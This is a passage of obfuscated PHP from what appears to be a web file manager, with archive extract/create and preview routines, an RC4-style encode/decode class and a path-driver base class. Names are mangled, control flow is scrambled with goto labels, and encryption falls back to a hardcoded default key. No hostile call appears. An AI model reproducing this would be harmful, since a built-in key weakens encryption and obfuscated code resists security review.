$F²ÍŒêŞâ˜[765], $d……ƒØº”“[$a¹­›Ì£©Ã][$F²ÍŒêŞâ˜[1922]]); if ($D’­¾ˆ´Øˆ) { $d……ƒØº”“[$a¹­›Ì£©Ã][$F²ÍŒêŞâ˜[1922]] = iconv_to($d……ƒØº”“[$a¹­›Ì£©Ã][$F²ÍŒêŞâ˜[1922]], $EŒÖ£íÑÎ, $F²ÍŒêŞâ˜[326]); unset($d……ƒØº”“[$a¹­›Ì£©Ã][$F²ÍŒêŞâ˜[1925]]); } } return array($F²ÍŒêŞâ˜[1029] => !0, $F²ÍŒêŞâ˜[1031] => $d……ƒØº”“); } else { return array($F²ÍŒêŞâ˜[1029] => !1, $F²ÍŒêŞâ˜[1031] => $d……ƒØº”“); } } static function extract($FóÏæµ•Úì, $E–ğÜíµƒ, $dò†Ä´¶Ö³ = "\x2d\x31", &$CÆ—ÚáË´ = false) { goto EãäÊŠ„¨ô; EãäÊŠ„¨ô: $F¶Ï«ò¹ù =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::init(); $bŒ…¨İñİ¾ = !empty($GLOBALS[$F¶Ï«ò¹ù[1046]]) ? $GLOBALS[$F¶Ï«ò¹ù[1046]] : get_path_ext($FóÏæµ•Úì); goto E“°™Ìœ„; E“°™Ìœ„: $A÷à®˜Â¤î = self::listContent($FóÏæµ•Úì, !1); if (!$A÷à®˜Â¤î[$F¶Ï«ò¹ù[1029]]) { return $A÷à®˜Â¤î; } if ($dò†Ä´¶Ö³ != $F¶Ï«ò¹ù[1028]) { goto C­çíÙÁÑŠ; d¦¸ÍäğÉ: if ($GLOBALS[$F¶Ï«ò¹ù[6]][$F¶Ï«ò¹ù[1152]] != $F¶Ï«ò¹ù[326]) { $DÚìø†ŞÑ² = unzip_pre_name($CÆ—ÚáË´); } $A×††«¼Ü = get_path_father($CÆ—ÚáË´); if ($A×††«¼Ü == $CÆ—ÚáË´) { $A×††«¼Ü = $F¶Ï«ò¹ù[33]; } goto eŒÊ‡ãÅ„ì; eŒÊ‡ãÅ„ì: if ($EĞ†“ëä[$F¶Ï«ò¹ù[76]]) { $DÚìø†ŞÑ² = rtrim($DÚìø†ŞÑ², $F¶Ï«ò¹ù[8]) . $F¶Ï«ò¹ù[8]; $CÆ—ÚáË´ = array($CÆ—ÚáË´); } $c´‰Œ±Ö„À = str_replace($F¶Ï«ò¹ù[93], $F¶Ï«ò¹ù[8], $DÚìø†ŞÑ²); if (substr($c´‰Œ±Ö„À, -1) == $F¶Ï«ò¹ù[8]) { if (!strstr(trim($c´‰Œ±Ö„À, $F¶Ï«ò¹ù[8]), $F¶Ï«ò¹ù[8])) { $E–ğÜíµƒ = $E–ğÜíµƒ . get_path_this($c´‰Œ±Ö„À) . $F¶Ï«ò¹ù[8]; } } else { if ($A×††«¼Ü == $DÚìø†ŞÑ²) { $A×††«¼Ü = $F¶Ï«ò¹ù[33]; } } goto AçˆÉ¾¯‹Ğ; C­çíÙÁÑŠ: $EĞ†“ëä = self::fileIndex($A÷à®˜Â¤î[$F¶Ï«ò¹ù[1031]], $dò†Ä´¶Ö³); $CÆ—ÚáË´ = str_replace(array($F¶Ï«ò¹ù[1069], $F¶Ï«ò¹ù[1924]), $F¶Ï«ò¹ù[70], $EĞ†“ëä[$F¶Ï«ò¹ù[1922]]); $DÚìø†ŞÑ² = $CÆ—ÚáË´; goto d¦¸ÍäğÉ; AçˆÉ¾¯‹Ğ: } goto cÉœ…ÎØœÅ; cÉœ…ÎØœÅ: if (self::checkIfType($bŒ…¨İñİ¾, $F¶Ï«ò¹ù[1904])) { if ($dò†Ä´¶Ö³ != $F¶Ï«ò¹ù[1028]) { $DÚìø†ŞÑ² = unzip_pre_name($DÚìø†ŞÑ²); $A×††«¼Ü = unzip_pre_name($A×††«¼Ü); $C’’‚³”¶ = PclTarExtractList($FóÏæµ•Úì, array($DÚìø†ŞÑ²), $E–ğÜíµƒ, $A×††«¼Ü, $bŒ…¨İñİ¾); } else { $C’’‚³”¶ = PclTarExtract($FóÏæµ•Úì, $E–ğÜíµƒ, $F¶Ï«ò¹ù[361], $bŒ…¨İñİ¾); } return array($F¶Ï«ò¹ù[1029] => $C’’‚³”¶, $F¶Ï«ò¹ù[1031] => PclErrorString(!0)); } else { if (self::checkIfType($bŒ…¨İñİ¾, $F¶Ï«ò¹ù[1042])) { return kodRarArchive::extract($FóÏæµ•Úì, $E–ğÜíµƒ, $bŒ…¨İñİ¾, $CÆ—ÚáË´); } else { if (kodZipArchive::support($F¶Ï«ò¹ù[1926])) { return kodZipArchive::extract($FóÏæµ•Úì, $E–ğÜíµƒ, $CÆ—ÚáË´); } else { $FÏ”¸íğˆ® = new PclZip($FóÏæµ•Úì); if ($dò†Ä´¶Ö³ != $F¶Ï«ò¹ù[1028]) { $C’’‚³”¶ = $FÏ”¸íğˆ®->extract(PCLZIP_OPT_PATH, $E–ğÜíµƒ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $F¶Ï«ò¹ù[1927], PCLZIP_OPT_BY_NAME, $EĞ†“ëä[$F¶Ï«ò¹ù[1922]], PCLZIP_OPT_REMOVE_PATH, $A×††«¼Ü, PCLZIP_OPT_REPLACE_NEWER); } else { $C’’‚³”¶ = $FÏ”¸íğˆ®->extract(PCLZIP_OPT_PATH, $E–ğÜíµƒ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $F¶Ï«ò¹ù[1927], PCLZIP_OPT_REPLACE_NEWER); } return array($F¶Ï«ò¹ù[1029] => $C’’‚³”¶, $F¶Ï«ò¹ù[1031] => $FÏ”¸íğˆ®->errorName(!0)); } } } return array($F¶Ï«ò¹ù[1029] => !1, $F¶Ï«ò¹ù[1031] => $F¶Ï«ò¹ù[1928]); goto Bë¢µ‡çª­; Bë¢µ‡çª­: } static function fileIndex($BšÏšàÌ½¬, $D„¯ğ³…‚†, $cË¾›”Óç = false) { goto A±ÅÀºó‡ò; AªÒÚÎÜîˆ: $E‘Ò±âæÛË = $dâ¡Ò½ö¶‡; if ($cË¾›”Óç) { $E‘Ò±âæÛË = $dâ¡Ò½ö¶‡[$cË¾›”Óç]; if ($dâ¡Ò½ö¶‡[$F×˜Ô×…Œô[76]]) { $E‘Ò±âæÛË = rtrim($E‘Ò±âæÛË, $F×˜Ô×…Œô[8]) . $F×˜Ô×…Œô[8]; } } return $E‘Ò±âæÛË; goto e¬¼Ó˜¹Ò›; b‹òî¢×’: $aŸÛ²®ˆ¦« = count($BšÏšàÌ½¬); for ($DŞÜ¶§¼‹§ = 0; $DŞÜ¶§¼‹§ < $aŸÛ²®ˆ¦«; $DŞÜ¶§¼‹§++) { if ($D„¯ğ³…‚† == $BšÏšàÌ½¬[$DŞÜ¶§¼‹§][$F×˜Ô×…Œô[1033]]) { $dâ¡Ò½ö¶‡ = $BšÏšàÌ½¬[$DŞÜ¶§¼‹§]; break; } } if (!$dâ¡Ò½ö¶‡) { show_tips($F×˜Ô×…Œô[1929]); } goto AªÒÚÎÜîˆ; A±ÅÀºó‡ò: $F×˜Ô×…Œô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::init(); if (!is_array($BšÏšàÌ½¬)) { return !1; } goto b‹òî¢×’; e¬¼Ó˜¹Ò›: } static function extractZipFile($A¥§ßÓÇ¶Ã, $c£È¢ÂÂÊŸ, $dä¹ÖøÍŸ = false) { goto EÄÙÄÅÉÒğ; dÊå ×‰°Ç: mk_dir($B—ãæ…ãØê); $bùóÚâò¹ = $B—ãæ…ãØê . md5($A¥§ßÓÇ¶Ã . $c£È¢ÂÂÊŸ); if ($dä¹ÖøÍŸ) { $bùóÚâò¹ = $B—ãæ…ãØê . $dä¹ÖøÍŸ; } goto d¸–„à‚„; AÅÀÜÂù°: $b¹×ÍöÂÂ = get_path_father($c£È¢ÂÂÊŸ); if ($b¹×ÍöÂÂ == $c£È¢ÂÂÊŸ) { $b¹×ÍöÂÂ = $BŒ†º÷£‰§[33]; } $eŞåéì†¯ = $c„ß…·Åˆ->extract(PCLZIP_OPT_PATH, $B—ãæ…ãØê, PCLZIP_CB_PRE_FILE_NAME, $BŒ†º÷£‰§[1927], PCLZIP_OPT_REMOVE_PATH, $b¹×ÍöÂÂ, PCLZIP_OPT_BY_NAME, $c£È¢ÂÂÊŸ); goto fÙ‰ªéÎÃñ; fÙ‰ªéÎÃñ: if (!file_exists($E‰ïŒÌ…‰­)) { return !1; } @rename($E‰ïŒÌ…‰­, $bùóÚâò¹); return $bùóÚâò¹; goto c‚îæ˜Û¾¼; d¸–„à‚„: if (file_exists($bùóÚâò¹)) { return $bùóÚâò¹; } $c„ß…·Åˆ = new PclZip($A¥§ßÓÇ¶Ã); $E‰ïŒÌ…‰­ = unzip_filter_ext($B—ãæ…ãØê . get_path_this($c£È¢ÂÂÊŸ)); goto AÅÀÜÂù°; EÄÙÄÅÉÒğ: $BŒ†º÷£‰§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::init(); $B—ãæ…ãØê = TEMP_FILES . hash_path($A¥§ßÓÇ¶Ã) . $BŒ†º÷£‰§[8]; goto dÊå ×‰°Ç; c‚îæ˜Û¾¼: } static function filePreview($B†¡ºçŸ“, $Cô©»öØºÏ, $eÄ„†İ™Ã = false, $fè£Æ ÅŠâ = false) { goto F‡Òœ†¬; e¾Áº× ¾ç: mk_dir($F…­Šõ¨Âá); $f«‡š¼‡·Ë = $F…­Šõ¨Âá . md5($B†¡ºçŸ“ . $Cô©»öØºÏ . $fè£Æ ÅŠâ); $A×ï‘©¯ = $C†Ğ»ÏÕÇõ[33]; goto C‚î‡÷‘†; Bº¹Úì·×ò: if (!file_exists($f«‡š¼‡·Ë)) { del_dir($F…­Šõ¨Âá); show_json($C†Ğ»ÏÕÇõ[1932]); } IO::fileOut($f«‡š¼‡·Ë, $eÄ„†İ™Ã, $EêäêöÖœ); goto fâŠõãÈ†; F‡Òœ†¬: $C†Ğ»ÏÕÇõ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::init(); $F…­Šõ¨Âá = TEMP_FILES . hash_path($B†¡ºçŸ“) . $C†Ğ»ÏÕÇõ[8]; goto e¾Áº× ¾ç; F‰Ëö¬Ñ™È: $A×ï‘©¯ = unzip_pre_name($A×ï‘©¯); $EêäêöÖœ = get_path_this($A×ï‘©¯); $d©ÇÎ‡©ï = unzip_filter_ext($F…­Šõ¨Âá . $EêäêöÖœ); goto e†¹Îòì”; e†¹Îòì”: if (!$E¸˜Ò÷î[$C†Ğ»ÏÕÇõ[1029]]) { show_json($E¸˜Ò÷î[$C†Ğ»ÏÕÇõ[1031]], !1); } if (!file_exists($d©ÇÎ‡©ï)) { show_json($C†Ğ»ÏÕÇõ[1931], !1); } @rename($d©ÇÎ‡©ï, $f«‡š¼‡·Ë); goto Bº¹Úì·×ò; C‚î‡÷‘†: $E¸˜Ò÷î = self::extract($B†¡ºçŸ“, $F…­Šõ¨Âá, $Cô©»öØºÏ, $A×ï‘©¯); if (is_array($A×ï‘©¯)) { show_json($C†Ğ»ÏÕÇõ[1930], !1); } if (file_exists($f«‡š¼‡·Ë)) { IO::fileOut($f«‡š¼‡·Ë, $eÄ„†İ™Ã, get_path_this($A×ï‘©¯)); return; } goto F‰Ëö¬Ñ™È; fâŠõãÈ†: } static function create($BŠÓ“Ø÷¦¥, $C¤ŒÍåîÊ’) { $B˜£Ìïí =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; self::init(); $cÃÙ×‰Ü¶ = get_path_ext($BŠÓ“Ø÷¦¥); $aƒŒ‰¢·Û = !1; if (self::checkIfType($cÃÙ×‰Ü¶, $B˜£Ìïí[301])) { if (kodZipArchive::support($B˜£Ìïí[1008])) { return kodZipArchive::create($BŠÓ“Ø÷¦¥, $C¤ŒÍåîÊ’); } $FñÅøƒåÑ = new PclZip($BŠÓ“Ø÷¦¥); foreach ($C¤ŒÍåîÊ’ as $F¨¹•›’ => $dè™³¸Úêõ) { $dè™³¸Úêõ = str_replace($B˜£Ìïí[469], $B˜£Ìïí[8], $dè™³¸Úêõ); $FæŠ±¸”ø = Kodio::clear(get_path_father($dè™³¸Úêõ)); if ($F¨¹•›’ == 0) { $aƒŒ‰¢·Û = $FñÅøƒåÑ->create($dè™³¸Úêõ, PCLZIP_OPT_REMOVE_PATH, $FæŠ±¸”ø, PCLZIP_CB_PRE_FILE_NAME, $B˜£Ìïí[1933]); continue; } $aƒŒ‰¢·Û = $FñÅøƒåÑ->add($dè™³¸Úêõ, PCLZIP_OPT_REMOVE_PATH, $FæŠ±¸”ø, PCLZIP_CB_PRE_FILE_NAME, $B˜£Ìïí[1933]); } } else { if (self::checkIfType($cÃÙ×‰Ü¶, $B˜£Ìïí[1904])) { foreach ($C¤ŒÍåîÊ’ as $F¨¹•›’ => $dè™³¸Úêõ) { $dè™³¸Úêõ = str_replace($B˜£Ìïí[469], $B˜£Ìïí[8], $dè™³¸Úêõ); $FæŠ±¸”ø = Kodio::clear(get_path_father($dè™³¸Úêõ)); if ($F¨¹•›’ == 0) { $aƒŒ‰¢·Û = PclTarCreate($BŠÓ“Ø÷¦¥, array($dè™³¸Úêõ), $cÃÙ×‰Ü¶, null, $FæŠ±¸”ø); continue; } $aƒŒ‰¢·Û = PclTarAddList($BŠÓ“Ø÷¦¥, array($dè™³¸Úêõ), $B˜£Ìïí[33], $FæŠ±¸”ø, $cÃÙ×‰Ü¶); } } } return $aƒŒ‰¢·Û; } } class Mcrypt { public static $defaultKey = "\141\x21\x74\x61\x6b\x41\72\x64\154\x6d\x63\x6c\x64\x45\166\54\145"; public static function encode($AÉ›Í–¼Û‚, $FÎ‰©çÑÎ = '', $c±¤Ûë = 0, $A•‘î“» = '') { goto dÁŠ¹àµ¿¡; e°‹†ÀòÓ÷: $a‡¿“œæ÷œ = substr($A•‘î“», -$aÛÃöóå¶÷); $CÄÁ´šâ³¹ = $f˜†Òò…¹¯ . md5($f˜†Òò…¹¯ . $a‡¿“œæ÷œ); $A‘’¥ÖÊ¤ = strlen($CÄÁ´šâ³¹); goto fØÚÄá÷×­; dÚ¾ö¶ãö: $f˜†Òò…¹¯ = md5(substr($FÎ‰©çÑÎ, 0, 16)); $Fâ¾ºÂñç³ = md5(substr($FÎ‰©çÑÎ, 16, 16)); $A•‘î“» = $A•‘î“» ? $A•‘î“» : md5(microtime()); goto e°‹†ÀòÓ÷; fØÚÄá÷×­: $AÉ›Í–¼Û‚ = sprintf($Eíîà¡…[1934], $c±¤Ûë ? $c±¤Ûë + time() : 0) . substr(md5($AÉ›Í–¼Û‚ . $Fâ¾ºÂñç³), 0, 16) . $AÉ›Í–¼Û‚; $cÎ¼«ê¸…Ä = strlen($AÉ›Í–¼Û‚); $E’¡å…Æƒ³ = array(); goto d‹à¼†ÁÚ; eÚÎï†¦ˆ: $d´²‹‘ŠÂ = $Eíîà¡…[33]; for ($fŞ³Õ¯ÒÒ˜ = $F˜²˜Ú™ì½ = $c´¤Ÿœ¹¼ï = 0; $c´¤Ÿœ¹¼ï < $cÎ¼«ê¸…Ä; $c´¤Ÿœ¹¼ï++) { $fŞ³Õ¯ÒÒ˜ = ($fŞ³Õ¯ÒÒ˜ + 1) % 256; $F˜²˜Ú™ì½ = ($F˜²˜Ú™ì½ + $Dó²ôÂçƒ[$fŞ³Õ¯ÒÒ˜]) % 256; $A‘¡‡‰¹µÎ = $Dó²ôÂçƒ[$fŞ³Õ¯ÒÒ˜]; $Dó²ôÂçƒ[$fŞ³Õ¯ÒÒ˜] = $Dó²ôÂçƒ[$F˜²˜Ú™ì½]; $Dó²ôÂçƒ[$F˜²˜Ú™ì½] = $A‘¡‡‰¹µÎ; $d´²‹‘ŠÂ .= chr(ord($AÉ›Í–¼Û‚[$c´¤Ÿœ¹¼ï]) ^ $Dó²ôÂçƒ[($Dó²ôÂçƒ[$fŞ³Õ¯ÒÒ˜] + $Dó²ôÂçƒ[$F˜²˜Ú™ì½]) % 256]); } $d´²‹‘ŠÂ = $a‡¿“œæ÷œ . str_replace($Eíîà¡…[903], $Eíîà¡…[33], base64_encode($d´²‹‘ŠÂ)); goto CÉœÈ‹²Ş; dÁŠ¹àµ¿¡: $Eíîà¡… =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÛÃöóå¶÷ = 4; $FÎ‰©çÑÎ = md5($FÎ‰©çÑÎ ? $FÎ‰©çÑÎ : self::$defaultKey); goto dÚ¾ö¶ãö; CÉœÈ‹²Ş: $d´²‹‘ŠÂ = str_replace(array($Eíîà¡…[284], $Eíîà¡…[8], $Eíîà¡…[903]), array($Eíîà¡…[412], $Eíîà¡…[70], $Eíîà¡…[91]), $d´²‹‘ŠÂ); return $d´²‹‘ŠÂ; goto A½¼…ãù“°; d‹à¼†ÁÚ: for ($c´¤Ÿœ¹¼ï = 0; $c´¤Ÿœ¹¼ï <= 255; $c´¤Ÿœ¹¼ï++) { $E’¡å…Æƒ³[$c´¤Ÿœ¹¼ï] = ord($CÄÁ´šâ³¹[$c´¤Ÿœ¹¼ï % $A‘’¥ÖÊ¤]); } $Dó²ôÂçƒ = range(0, 255); for ($F˜²˜Ú™ì½ = $c´¤Ÿœ¹¼ï = 0; $c´¤Ÿœ¹¼ï < 256; $c´¤Ÿœ¹¼ï++) { $F˜²˜Ú™ì½ = ($F˜²˜Ú™ì½ + $Dó²ôÂçƒ[$c´¤Ÿœ¹¼ï] + $E’¡å…Æƒ³[$c´¤Ÿœ¹¼ï]) % 256; $A‘¡‡‰¹µÎ = $Dó²ôÂçƒ[$c´¤Ÿœ¹¼ï]; $Dó²ôÂçƒ[$c´¤Ÿœ¹¼ï] = $Dó²ôÂçƒ[$F˜²˜Ú™ì½]; $Dó²ôÂçƒ[$F˜²˜Ú™ì½] = $A‘¡‡‰¹µÎ; } goto eÚÎï†¦ˆ; A½¼…ãù“°: } public static function decode($c³Û•–˜, $fŸÓ®ˆ‘¾• = '') { goto c¤±¼ÙÙ™; fŠ­å“ƒº: $fŸÓ®ˆ‘¾• = md5($fŸÓ®ˆ‘¾• ? $fŸÓ®ˆ‘¾• : self::$defaultKey); $cøÁÌß›„ = md5(substr($fŸÓ®ˆ‘¾•, 0, 16)); $B­©–Å‹¬§ = md5(substr($fŸÓ®ˆ‘¾•, 16, 16)); goto FÊã‹ôõ«; c¤±¼ÙÙ™: $EÙ©½†„Í­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c³Û•–˜ = str_replace(array($EÙ©½†„Í­[412], $EÙ©½†„Í­[70], $EÙ©½†„Í­[91]), array($EÙ©½†„Í­[284], $EÙ©½†„Í­[8], $EÙ©½†„Í­[903]), $c³Û•–˜); $E¯£”‘Çó¼ = 4; goto fŠ­å“ƒº; FÊã‹ôõ«: $bÀ²¦»À¼Å = substr($c³Û•–˜, 0, $E¯£”‘Çó¼); $dæø„Šá‡« = $cøÁÌß›„ . md5($cøÁÌß›„ . $bÀ²¦»À¼Å); $cÓç³ „‚Ô = strlen($dæø„Šá‡«); goto a›ƒš“à‡õ; a›ƒš“à‡õ: $c³Û•–˜ = base64_decode(substr($c³Û•–˜, $E¯£”‘Çó¼)); $aññù£ÂŠë = strlen($c³Û•–˜); $Dèáø†ªëæ = array(); goto dƒŞ‡åÇ–®; c²ô™ÇÈô×: if (($dÑÏ³½¶ï == 0 || $dÑÏ³½¶ï - time() > 0) && substr($AùÖ¤ä¢ˆ®, 10, 16) == substr(md5(substr($AùÖ¤ä¢ˆ®, 26) . $B­©–Å‹¬§), 0, 16)) { return substr($AùÖ¤ä¢ˆ®, 26); } else { return $EÙ©½†„Í­[33]; } goto ağî¹¼‹¡Ğ; dƒŞ‡åÇ–®: for ($b ©ËèÁÀ = 0; $b ©ËèÁÀ <= 255; $b ©ËèÁÀ++) { $Dèáø†ªëæ[$b ©ËèÁÀ] = ord($dæø„Šá‡«[$b ©ËèÁÀ % $cÓç³ „‚Ô]); } $FÖï×ğ×µ = range(0, 255); for ($f˜‚Ş‰ø™— = $b ©ËèÁÀ = 0; $b ©ËèÁÀ < 256; $b ©ËèÁÀ++) { $f˜‚Ş‰ø™— = ($f˜‚Ş‰ø™— + $FÖï×ğ×µ[$b ©ËèÁÀ] + $Dèáø†ªëæ[$b ©ËèÁÀ]) % 256; $Dàó“œöğÏ = $FÖï×ğ×µ[$b ©ËèÁÀ]; $FÖï×ğ×µ[$b ©ËèÁÀ] = $FÖï×ğ×µ[$f˜‚Ş‰ø™—]; $FÖï×ğ×µ[$f˜‚Ş‰ø™—] = $Dàó“œöğÏ; } goto Bó¥–Ú¡; Bó¥–Ú¡: $AùÖ¤ä¢ˆ® = $EÙ©½†„Í­[33]; for ($aŒÚ‘ÑÈ‡Š = $f˜‚Ş‰ø™— = $b ©ËèÁÀ = 0; $b ©ËèÁÀ < $aññù£ÂŠë; $b ©ËèÁÀ++) { $aŒÚ‘ÑÈ‡Š = ($aŒÚ‘ÑÈ‡Š + 1) % 256; $f˜‚Ş‰ø™— = ($f˜‚Ş‰ø™— + $FÖï×ğ×µ[$aŒÚ‘ÑÈ‡Š]) % 256; $Dàó“œöğÏ = $FÖï×ğ×µ[$aŒÚ‘ÑÈ‡Š]; $FÖï×ğ×µ[$aŒÚ‘ÑÈ‡Š] = $FÖï×ğ×µ[$f˜‚Ş‰ø™—]; $FÖï×ğ×µ[$f˜‚Ş‰ø™—] = $Dàó“œöğÏ; $AùÖ¤ä¢ˆ® .= chr(ord($c³Û•–˜[$b ©ËèÁÀ]) ^ $FÖï×ğ×µ[($FÖï×ğ×µ[$aŒÚ‘ÑÈ‡Š] + $FÖï×ğ×µ[$f˜‚Ş‰ø™—]) % 256]); } $dÑÏ³½¶ï = intval(substr($AùÖ¤ä¢ˆ®, 0, 10)); goto c²ô™ÇÈô×; ağî¹¼‹¡Ğ: } } goto CÊÙ»Ò‡¶×; DÆ°ø¢Á: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $eÅ˜Ñ‰ÓÅƒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->objectDriver = array($eÅ˜Ñ‰ÓÅƒ[57], $eÅ˜Ñ‰ÓÅƒ[58], $eÅ˜Ñ‰ÓÅƒ[59], $eÅ˜Ñ‰ÓÅƒ[60], $eÅ˜Ñ‰ÓÅƒ[61], $eÅ˜Ñ‰ÓÅƒ[62], $eÅ˜Ñ‰ÓÅƒ[63], $eÅ˜Ñ‰ÓÅƒ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($A±Úå¤Õ¦é) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($A±Úå¤Õ¦é, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][8]); } return $A±Úå¤Õ¦é; } public function getPathName($d–¢ß¿ª×é) { return $d–¢ß¿ª×é; } public function iconvApp($B·“•ÏïÒä) { return $B·“•ÏïÒä; } public function iconvSystem($fÅ¼òœ¿Ÿã) { return $fÅ¼òœ¿Ÿã; } public function iconvTo($CÆÆõ•ËË, $C¥†ÍøÔ™Á, $bÃ½¼ƒ¿Şµ) { goto f»°ØÂòÎ; d’šì™ºåœ: $C„ÜÕ˜Ù¸ì = $C¥†ÍøÔ™Á . $Eù½ƒë©…í[66] . $bÃ½¼ƒ¿Şµ . $Eù½ƒë©…í[67] . $CÆÆõ•ËË; if (isset($CÛÇÄÆù‰[$C„ÜÕ˜Ù¸ì])) { return $CÛÇÄÆù‰[$C„ÜÕ˜Ù¸ì]; } if (function_exists($Eù½ƒë©…í[68])) { $Eº¯Ç›çÓŠ = @mb_convert_encoding($CÆÆõ•ËË, $bÃ½¼ƒ¿Şµ, $C¥†ÍøÔ™Á); } else { $Eº¯Ç›çÓŠ = @iconv($C¥†ÍøÔ™Á, $bÃ½¼ƒ¿Şµ, $CÆÆõ•ËË); } goto Bâ¯…‘Êğ„; f»°ØÂòÎ: $Eù½ƒë©…í =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$CÆÆõ•ËË || !function_exists($Eù½ƒë©…í[65])) { return $CÆÆõ•ËË; } static $CÛÇÄÆù‰ = array(); goto d’šì™ºåœ; aßÎÓéë: $CÛÇÄÆù‰[$bÃ½¼ƒ¿Şµ . $Eù½ƒë©…í[66] . $C¥†ÍøÔ™Á . $Eù½ƒë©…í[67] . $CÆÆõ•ËË] = $CÆÆõ•ËË; $CÛÇÄÆù‰[$bÃ½¼ƒ¿Şµ . $Eù½ƒë©…í[66] . $C¥†ÍøÔ™Á . $Eù½ƒë©…í[67] . $Eº¯Ç›çÓŠ] = $CÆÆõ•ËË; $CÛÇÄÆù‰[$C¥†ÍøÔ™Á . $Eù½ƒë©…í[66] . $bÃ½¼ƒ¿Şµ . $Eù½ƒë©…í[67] . $Eº¯Ç›çÓŠ] = $Eº¯Ç›çÓŠ; goto B«©²Œ§Ê’; B«©²Œ§Ê’: return $Eº¯Ç›çÓŠ; goto f‰™™’¹˜À; Bâ¯…‘Êğ„: $Eº¯Ç›çÓŠ = $Eº¯Ç›çÓŠ ? $Eº¯Ç›çÓŠ : $CÆÆõ•ËË; if (strstr($Eº¯Ç›çÓŠ, $Eù½ƒë©…í[69])) { $Eº¯Ç›çÓŠ = str_replace($Eù½ƒë©…í[69], $Eù½ƒë©…í[70], $Eº¯Ç›çÓŠ); } $CÛÇÄÆù‰[$C¥†ÍøÔ™Á . $Eù½ƒë©…í[66] . $bÃ½¼ƒ¿Şµ . $Eù½ƒë©…í[67] . $CÆÆõ•ËË] = $Eº¯Ç›çÓŠ; goto aßÎÓéë; f‰™™’¹˜À: } public function getPathInner($bğ«ÑÓ¡µá) { $AŸ„á‘« = IO::init($bğ«ÑÓ¡µá); return $AŸ„á‘«->path; } public function getPathOuter($B‚°ä¦¬Şš) { $C®îĞà¬œ† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A”ÍÒòÛ°» = strlen(trim($this->pathBase, $C®îĞà¬œ†[8])); $B‚°ä¦¬Şš = substr(trim($B‚°ä¦¬Şš, $C®îĞà¬œ†[8]), $A”ÍÒòÛ°»); return $this->pathDriver . $C®îĞà¬œ†[8] . ltrim($B‚°ä¦¬Şš, $C®îĞà¬œ†[8]); } public function isParentOf($FÄåˆ¸‹ ©, $bØÀ¶ìÅ·œ) { $c¶½æ Ÿë =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FÄåˆ¸‹ © = rtrim(strtolower($FÄåˆ¸‹ ©), $c¶½æ Ÿë[8]) . $c¶½æ Ÿë[8]; $bØÀ¶ìÅ·œ = rtrim(strtolower($bØÀ¶ìÅ·œ), $c¶½æ Ÿë[8]) . $c¶½æ Ÿë[8]; $aøğîœÜ¥Ä = strpos($bØÀ¶ìÅ·œ, $FÄåˆ¸‹ ©) === 0; return $aøğîœÜ¥Ä; } public function getType() { $CåïÁÆô¢‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÖ¹–ªƒ¯ò = str_replace($CåïÁÆô¢‘[71], $CåïÁÆô¢‘[33], get_class($this)); return strtolower($cÖ¹–ªƒ¯ò); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($d‚¦èö®ªŠ, $cÅ¢õË£ä) { $c”Ï­„¸™ç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bíô¹‰¢­„ = rtrim($d‚¦èö®ªŠ, $c”Ï­„¸™ç[8]) . $c”Ï­„¸™ç[8] . $cÅ¢õË£ä; $D—óøÑ†”÷ = $this->exist($Bíô¹‰¢­„); return $D—óøÑ†”÷ ? $Bíô¹‰¢­„ : !1; } public function setModifyTime($aÇïÍğÈ‡¼, $F²Æ„¨¿×È = '') { } public function renameObject($FóÂé‹Ñ•, $Fõ¸¾§Ô¾) { goto bßˆÁ„Æôè; bßˆÁ„Æôè: $dÀÁ‹—’ê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $BœÆ¤áÅ©Í = $Fõ¸¾§Ô¾; Hook::trigger($dÀÁ‹—’ê[72], $this, $FóÂé‹Ñ•, $this, $this->pathFather($FóÂé‹Ñ•) . $Fõ¸¾§Ô¾); goto ešœ²æ“Ò¶; bæã¦Ì¼‘: return $f“•ó‡®Ê ? $Fõ¸¾§Ô¾ : !1; goto AËäÀ¶Ÿõ»; ešœ²æ“Ò¶: $FóÂé‹Ñ• = $this->getPathOuter($FóÂé‹Ñ•); $Fõ¸¾§Ô¾ = $this->pathFather($FóÂé‹Ñ•) . $Fõ¸¾§Ô¾; if (IO::isFile($FóÂé‹Ñ•)) { $f“•ó‡®Ê = IO::copy($FóÂé‹Ñ•, $this->pathFather($FóÂé‹Ñ•), REPEAT_RENAME_FOLDER, $BœÆ¤áÅ©Í); if ($f“•ó‡®Ê) { IO::remove($FóÂé‹Ñ•); } } else { $f“•ó‡®Ê = IO::mkdir($Fõ¸¾§Ô¾); if (!$f“•ó‡®Ê) { return !1; } $CÁ§ùŸ™Œ¸ = IO::listPath($FóÂé‹Ñ•, !0); $F£×ª÷Èàº = array_merge($CÁ§ùŸ™Œ¸[$dÀÁ‹—’ê[73]], $CÁ§ùŸ™Œ¸[$dÀÁ‹—’ê[74]]); foreach ($F£×ª÷Èàº as $AÂ®Ç©ØóŞ) { IO::move($AÂ®Ç©ØóŞ[$dÀÁ‹—’ê[75]], $Fõ¸¾§Ô¾, REPEAT_RENAME_FOLDER); } IO::remove($FóÂé‹Ñ•); } goto bæã¦Ì¼‘; AËäÀ¶Ÿõ»: } public function tempFile($aÎ¨µğŸ¤¿ = '', 